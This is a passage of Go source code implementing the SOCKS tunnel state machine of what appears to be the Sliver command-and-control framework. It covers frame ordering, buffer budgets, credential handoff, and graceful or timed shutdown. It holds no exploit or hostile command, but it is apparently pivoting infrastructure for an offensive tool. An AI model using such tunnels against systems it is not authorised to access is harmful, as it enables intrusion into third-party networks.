		s.budgetBytes+len(frame.data) > socksTunnelMaxPendingBytes {
		return false
	}
	if s.reserveTotal != nil && !s.reserveTotal(len(frame.data)) {
		return false
	}
	s.budgetFrames++
	s.budgetBytes += len(frame.data)
	return true
}

func (s *socksTunnelState) release(frame socksTunnelFrame) {
	s.budgetMutex.Lock()
	if s.budgetClosed {
		s.budgetMutex.Unlock()
		return
	}
	s.budgetFrames--
	s.budgetBytes -= len(frame.data)
	releaseTotal := s.releaseTotal
	s.budgetMutex.Unlock()
	if releaseTotal != nil {
		releaseTotal(len(frame.data))
	}
}

// releaseRetainedBudget releases bytes that remain reachable from a closed
// actor only after its replay tombstone is removed. Until then the pool-wide
// counter continues to cover the actual payload memory retained by ingress.
func (s *socksTunnelState) releaseRetainedBudget() {
	s.retainedOnce.Do(func() {
		s.budgetMutex.Lock()
		retainedBytes := s.retainedBytes
		s.retainedBytes = 0
		releaseTotal := s.releaseTotal
		s.budgetMutex.Unlock()
		if releaseTotal != nil {
			releaseTotal(retainedBytes)
		}
	})
}

func sameSocksTunnelFrame(first socksTunnelFrame, second socksTunnelFrame) bool {
	return first.close == second.close && first.capabilities == second.capabilities && bytes.Equal(first.data, second.data)
}

func signalSocksServerStart(frame socksTunnelFrame, admission socksServerAdmission) {
	if frame.serverStart != nil {
		frame.serverStart <- admission
	}
}

func (s *socksTunnelState) publishServerCredentials(frame socksTunnelFrame) bool {
	s.startMutex.Lock()
	defer s.startMutex.Unlock()
	if s.serverReady || s.serverClaimed {
		return false
	}
	select {
	case <-s.done:
		return false
	case <-s.ownerDone:
		return false
	default:
		s.serverReady = true
		s.username = frame.username
		s.password = frame.password
		return true
	}
}

func (s *socksTunnelState) takeServerCredentials() (string, string, bool) {
	s.startMutex.Lock()
	defer s.startMutex.Unlock()
	if !s.serverReady || s.serverClaimed {
		return "", "", false
	}
	select {
	case <-s.done:
		s.username = ""
		s.password = ""
		s.serverReady = false
		return "", "", false
	case <-s.ownerDone:
		s.username = ""
		s.password = ""
		s.serverReady = false
		return "", "", false
	default:
	}
	username := s.username
	password := s.password
	s.username = ""
	s.password = ""
	s.serverReady = false
	s.serverClaimed = true
	return username, password, true
}

// The actor deliberately keeps admission, ordering, terminal handling, and
// reorder timeout in one select loop so those lifecycle transitions are atomic.
//
//nolint:gocyclo
func (s *socksTunnelState) run() {
	nextSequence := uint64(0)
	pending := map[uint64]socksTunnelFrame{}
	legacyTerminal := false
	var closeTimer *time.Timer
	var closeTimerC <-chan time.Time
	resetCloseTimer := func() {
		if closeTimer == nil {
			closeTimer = time.NewTimer(s.closeWindow)
			closeTimerC = closeTimer.C
			return
		}
		if !closeTimer.Stop() {
			select {
			case <-closeTimer.C:
			default:
			}
		}
		closeTimer.Reset(s.closeWindow)
	}
	stopCloseTimer := func() {
		if closeTimer == nil {
			return
		}
		if !closeTimer.Stop() {
			select {
			case <-closeTimer.C:
			default:
			}
		}
		closeTimer = nil
		closeTimerC = nil
	}
	defer func() {
		if closeTimer != nil {
			closeTimer.Stop()
		}
	}()

	for {
		select {
		case <-s.done:
			return
		case <-s.ownerDone:
			s.close()
			return
		case <-closeTimerC:
			if legacyTerminal && len(pending) == 0 {
				// Pre-lifecycle servers emitted every terminal at sequence zero.
				// A quiet window lets earlier data handler goroutines catch up before
				// exposing EOF, while still bounding close-before-create state.
				if nextSequence == 0 {
					s.close()
				} else {
					s.beginGracefulClose()
				}
				return
			}
			// A missing frame must not strand a tunnel forever. Modern senders use
			// contiguous sequences, so a persistent gap is corrupt.
			s.close()
			return
		case frame := <-s.ingress:
			if frame.close && frame.sequence == 0 {
				if frame.capabilities&sliverpb.CapabilitySocksFlowControlV1 != 0 {
					// A negotiated sequence-zero terminal is an ordered empty stream,
					// not the unsequenced close emitted by legacy servers.
					s.enableFlowControl(frame.capabilities)
					signalSocksServerStart(frame, socksServerAccepted)
					s.release(frame)
					s.close()
					return
				}
				// Legacy servers did not sequence terminal frames. Treat sequence
				// zero as a provisional EOF even after data has advanced the modern
				// sequence, and wait one bounded quiet window for concurrently
				// dispatched earlier data to reach this actor.
				signalSocksServerStart(frame, socksServerAccepted)
				s.release(frame)
				if !legacyTerminal {
					legacyTerminal = true
					resetCloseTimer()
				}
				continue
			}
			if frame.sequence < nextSequence {
				signalSocksServerStart(frame, socksServerAccepted)
				s.release(frame)
				continue
			}
			if frame.sequence-nextSequence >= socksTunnelMaxPendingFrames {
				signalSocksServerStart(frame, socksServerRejected)
				s.release(frame)
				s.close()
				return
			}
			if existing, ok := pending[frame.sequence]; ok {
				admission := socksServerAccepted
				if !sameSocksTunnelFrame(existing, frame) {
					admission = socksServerRejected
				}
				signalSocksServerStart(frame, admission)
				s.release(frame)
				if admission == socksServerRejected {
					s.close()
					return
				}
				continue
			}
			pending[frame.sequence] = frame
			if frame.sequence > nextSequence && closeTimer == nil {
				resetCloseTimer()
			}

			for {
				ordered, ok := pending[nextSequence]
				if !ok {
					break
				}
				delete(pending, nextSequence)
				if ordered.sequence == 0 {
					s.enableFlowControl(ordered.capabilities)
				}
				if ordered.close {
					signalSocksServerStart(ordered, socksServerRejected)
					s.release(ordered)
					for _, future := range pending {
						signalSocksServerStart(future, socksServerRejected)
						s.release(future)
					}
					clear(pending)
					// A contiguous terminal is an ordered EOF, not an abort. All
					// preceding frames are already buffered for the SOCKS reader;
					// let it consume their complete payloads before go-socks5
					// half-closes the target. The bounded drain watchdog below still
					// force-closes a target that never consumes the queued input.
					s.beginGracefulClose()
					return
				}
				if ordered.sequence == 0 {
					if !s.publishServerCredentials(ordered) {
						signalSocksServerStart(ordered, socksServerRejected)
						s.release(ordered)
						s.close()
						return
					}
					ordered.username = ""
					ordered.password = ""
					signalSocksServerStart(ordered, socksServerStart)
				}
				select {
				case <-s.done:
					return
				case <-s.ownerDone:
					s.close()
					return
				case s.data <- ordered:
				}
				nextSequence++
			}
			if legacyTerminal {
				// Each contiguous data advance restarts the quiet period. This
				// accommodates handler scheduling reordering without retaining the
				// legacy tunnel indefinitely after traffic actually stops.
				resetCloseTimer()
			} else if len(pending) == 0 {
				stopCloseTimer()
			} else if closeTimer != nil {
				// The timer detects a persistent missing sequence, not a slow but
				// valid drain. Every contiguous frame extends the reorder window.
				resetCloseTimer()
			}
		}
	}
}

func (s *socksTunnelState) isClosed() bool {
	return s == nil || s.lifecycle.Load() == socksTunnelClosed
}

func (s *socksTunnelState) isGraceful() bool {
	return s != nil && s.lifecycle.Load() == socksTunnelGraceful
}

func (s *socksTunnelState) read() ([]byte, error) {
	frame, err := s.readFrame()
	if err != nil {
		return nil, err
	}
	s.release(frame)
	return frame.data, nil
}

func (s *socksTunnelState) readFrame() (socksTunnelFrame, error) {
	for {
		if s.isClosed() {
			return socksTunnelFrame{}, io.EOF
		}
		select {
		case frame := <-s.data:
			if s.isClosed() {
				s.release(frame)
				return socksTunnelFrame{}, io.EOF
			}
			return frame, nil
		default:
		}
		if s.lifecycle.Load() == socksTunnelGraceful {
			return socksTunnelFrame{}, io.EOF
		}
		select {
		case frame := <-s.data:
			if s.isClosed() {
				s.release(frame)
				return socksTunnelFrame{}, io.EOF
			}
			return frame, nil
		case <-s.inputEOF:
			// The actor closes inputEOF only after every preceding frame is in
			// data, so the next loop either drains one or returns ordered EOF.
		case <-s.done:
			return socksTunnelFrame{}, io.EOF
		case <-s.ownerDone:
			s.close()
			return socksTunnelFrame{}, io.EOF
		}
	}
}

func (s *socksTunnelState) beginGracefulClose() {
	s.ingressMutex.Lock()
	if !s.lifecycle.CompareAndSwap(socksTunnelActive, socksTunnelGraceful) {
		s.ingressMutex.Unlock()
		return
	}
drainIngress:
	for {
		select {
		case frame := <-s.ingress:
			signalSocksServerStart(frame, socksServerRejected)
			s.release(frame)
		default:
			break drainIngress
		}
	}
	s.ingressMutex.Unlock()
	s.gracefulOnce.Do(func() { close(s.inputEOF) })
	drainWindow := s.drainWindow
	if drainWindow <= 0 {
		drainWindow = socksTunnelGracefulDrain
	}
	go func() {
		timer := time.NewTimer(drainWindow)
		defer timer.Stop()
		select {
		case <-s.done:
		case <-timer.C:
			s.close()
		}
	}()
}

func (s *socksTunnelState) startHandshakeLease() {
	s.handshakeOnce.Do(func() {
		timeout := s.handshakeTimeout
		if timeout <= 0 {
			timeout = socksTunnelHandshakeTimeout
		}
		go func() {
			timer := time.NewTimer(timeout)
			defer timer.Stop()
			select {
			case <-s.done:
			case <-s.established:
			case <-timer.C:
				s.close()
			}
		}()
	})
}

func (s *socksTunnelState) markEstablished() {
	s.establishedOnce.Do(func() { close(s.established) })
}

func (s *socksTunnelState) close() bool {
	closed := false
	s.closeOnce.Do(func() {
		s.lifecycle.Store(socksTunnelClosed)
		s.budgetMutex.Lock()
		s.retainedBytes = s.budgetBytes
		s.budgetClosed = true
		s.budgetFrames = 0
		s.budgetBytes = 0
		s.budgetMutex.Unlock()
		close(s.done)
		s.startMutex.Lock()
		s.serverReady = false
		s.username = ""
		s.password = ""
		s.startMutex.Unlock()
		closed = true
		if s.onClose != nil {
			s.onClose()
		}
	})
	return closed
}
